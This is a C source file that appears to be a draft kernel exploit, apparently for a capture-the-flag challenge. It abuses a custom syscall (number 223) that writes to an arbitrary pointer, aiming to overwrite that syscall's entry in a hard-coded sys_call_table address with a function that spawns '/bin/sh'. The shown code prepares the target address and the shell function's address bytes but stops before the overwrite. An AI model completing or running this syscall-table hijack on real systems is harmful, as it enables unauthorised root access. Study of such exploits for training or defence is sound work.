#include <stdio.h> 
#include <linux/kernel.h>
#include <sys/syscall.h>
#include <unistd.h> 
#include <stdlib.h>
#include <string.h>

#define SYS_CALL_TABLE		0x8000e348		// manually configure this address!!
#define NR_SYS_UNUSED		223

long sys_upper(char* in, char* out)
{
	return syscall(NR_SYS_UNUSED, in, out);
}

void give_shell()
{
	system("/bin/sh");
}

int main(int argc, char* argv[])
{
	char* in = "foobarbaz";
	char* out = malloc(strlen(in) + 1);
	memset(out, 0, strlen(in) + 1);
	printf("In:         %s\n", in);
	printf("Out before: %s\n", out);
	long ret = sys_upper(in, out);
	printf("Out after:  %s\n", out);
	printf("Return: %ld\n", ret);
	
	unsigned int** sct = (unsigned int**)SYS_CALL_TABLE;
	unsigned int** svc_table_entry = &sct[NR_SYS_UNUSED];
	char buff[5] = {0};
	unsigned int shell_addr = (unsigned int)give_shell;
	buff[0] = (shell_addr >> 0)  & 0xFF;
	buff[1] = (shell_addr >> 8)  & 0xFF;
	buff[2] = (shell_addr >> 16) & 0xFF;
	buff[3] = (shell_addr >> 24) & 0xFF;
	printf("give_shell addr = %08x\n", shell_addr);
	
	
	return 0;
	
}